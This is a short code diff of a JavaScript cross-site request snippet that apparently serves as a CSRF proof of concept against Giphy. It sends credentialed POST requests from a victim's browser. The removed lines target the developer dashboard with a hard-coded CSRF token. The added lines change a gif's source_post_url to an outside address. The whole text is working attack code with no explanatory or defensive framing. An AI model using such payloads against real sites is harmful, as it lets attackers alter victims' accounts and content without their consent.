@@ -9,7 +9,7 @@ var xhr = new XMLHttpRequest();
         }
     };
    xhr.withCredentials = true;
-    xhr.open("post", "https://developers.giphy.com/dashboard/", true);
+    xhr.open("post", "https://giphy.com/ajax/gif/update", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-    xhr.send("csrfmiddlewaretoken=SWlKcqCNCkXNlLht0N1lSLGiUXUFTknxAJFCpYu9P8ewM30oAiPZovBre2jBrE58&name=gg&description=dddoo&sdk=false&terms=true");
+    xhr.send("gif_id=pXuuwZj9u3Ar1GgivY&key=source_post_url&value=http%3A%2F%2Ftestus.COM");
